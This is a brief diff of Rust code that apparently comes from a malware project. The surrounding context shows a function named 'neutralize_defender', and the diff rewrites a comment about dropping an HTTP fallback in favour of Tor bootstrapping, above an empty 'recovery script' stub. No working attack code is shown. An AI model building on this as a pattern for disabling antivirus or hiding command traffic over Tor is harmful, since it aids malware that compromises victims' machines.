@@ -61,7 +61,7 @@ pub fn neutralize_defender() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 
-// Recovery Script removed. HTTP Fallback deprecated in favor of Tor Bootstrap.
+// Recovery Script (Disabled)
 fn get_recovery_script() -> String {
     String::new() 
 }
